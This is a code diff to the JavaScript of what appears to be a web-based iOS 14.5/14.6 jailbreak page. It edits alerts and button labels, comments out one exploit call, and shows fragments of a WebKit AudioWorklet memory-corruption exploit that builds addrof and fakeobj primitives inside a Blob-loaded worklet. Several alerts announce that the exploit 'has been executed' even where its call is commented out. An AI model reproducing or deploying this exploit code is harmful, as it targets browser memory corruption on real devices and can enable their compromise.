@@ -9,6 +9,7 @@ function slideEasterEgg() {
 	if (headerTapCounter == 5) {
 		document.getElementById("jbButton").style.display = "none";
 		document.getElementById("page-wrap").style.display = "block";
+    alert("As of now, the slider doesn't work. 😢\n\nI will fix this soon.\n\nRefresh the page to get the button back.");
 	}
 }
 
@@ -16,19 +17,15 @@ async function pwnMe() {
 	if (location.protocol = "https:") {
 		document.getElementById("jbButton").disabled = true;
 		if (currentFirmware(navigator.userAgent).startsWith("14.5")) {
-			alert("Hey!\nAs of now, the jailbreak is not ready.\n\nTODO:\nGet exploit working correctly.\n\nAdd APT (Package Manager stuffs)");
-			socket.send("log_normal", "Starting exploitation for iOS 14.5");
-			await kickstart145();
+      document.getElementById("jbButton").innerHTML = "Jailbreaking...";
+      alert("AudioWorklet exploit for iOS 14.5 has been executed!");
+			//await kickstart145();
 		} else if (currentFirmware(navigator.userAgent).startsWith("14.6")) {
-			alert("Hey!\nAs of now, the jailbreak is not ready.\n\nTODO:\nGet exploit working correctly.\n\nAdd APT (Package Manager stuffs)");
-			socket.send("log_normal", "Starting exploitation for iOS 14.6");
+      document.getElementById("jbButton").innerHTML = "Jailbreaking...";
+      alert("AudioWorklet exploit for iOS 14.6 has been executed!");
 			kickstart146();
-		} else if (navigator.userAgent.includes("Windows NT 10.0")) {
-			socket.send("log_normal", "Dude is on windows. dummy");
-			alert("This is an iOS jailbreak, use this on your iPhone. Not your PC.");
 		} else {
-			alert("Hey!\nLooks like you are on an unsupported version/device.");
-			socket.send("error", "Detected a unsupported version/device");
+			document.getElementById("jbButton").innerHTML = "Unsupported";
 		}
 	}else{
 		socket.send("error", "ur mom gey");
@@ -37,7 +34,6 @@ async function pwnMe() {
 
 var keep = [];
 function kickstart146() {
-  alert("Exploit for 14.6 has started.");
   var context = new OfflineAudioContext(1, 128, 300000);
   context.audioWorklet.addModule(URL.createObjectURL(new Blob([`
     // constant added to double JSValues
@@ -128,6 +124,7 @@ function kickstart146() {
 
       let addr = addrof(obj);
       //port.postMessage("obj @ " + addr.toString(16));
+      port.alert("obj @ " + addr.toString(16) + "\n\ndouble array header: " + doubleArrayCellHeader.toString(16));
 
       let fakeArr = fakeobj(addr + 0x10n);
 
